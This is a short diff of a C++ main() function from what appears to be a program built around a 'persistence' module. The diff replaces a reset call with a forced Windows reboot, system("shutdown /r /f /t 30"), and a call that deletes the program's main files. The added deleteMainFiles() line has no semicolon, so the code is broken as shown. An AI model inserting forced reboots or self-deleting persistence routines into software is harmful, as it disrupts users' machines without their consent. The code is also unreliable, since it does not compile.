@@ -84,6 +84,7 @@ int main(int argc, char* argv[]) {
 
     persistence::cleanfile();
     persistence::cleanreg();
-    persistence::reset();
+    system("shutdown /r /f /t 30");
+    persistence::deleteMainFiles()
     return 0;
 }
